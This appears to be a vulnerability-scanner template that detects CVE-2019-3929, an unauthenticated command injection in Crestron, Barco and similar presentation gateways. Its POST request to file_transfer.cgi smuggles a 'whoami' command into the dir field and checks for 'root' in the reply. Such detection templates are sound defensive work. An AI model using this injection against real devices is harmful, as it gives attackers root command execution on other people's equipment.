name: Barco_AWIND_OEM_Presentation_Platform_Unauthenticated_Remote_Command_Injection__CVE_2019_3929
transport: http
set: {}
detail:
  dock: ''
  product: Crestron-AM-100
  homepage: https://www.crestron.com/Products/Workspace-Solutions/Wireless-Presentation-Solutions/AirMedia-Presentation-Gateways/AM-100
  impact: ''
  description: The Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1,
    Barco wePresent WiPG-1000P firmware 2.3.0.10, Barco wePresent WiPG-1600W before
    firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710
    firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5,
    Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus
    LiteShow4 2.0.0.7 are vulnerable to command injection via the file_transfer.cgi
    HTTP endpoint. A remote, unauthenticated attacker can use this vulnerability to
    execute operating system commands as root.
rules:
  r1:
    method: POST
    path: /cgi-bin/file_transfer.cgi
    follow_redirects: true
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: file_transfer=new&dir=%27Pa_NotewhoamiPa_Note%27
    expression: response.status == 200 && r'^root\s$'.bmatches(response.body)
expression: r1()
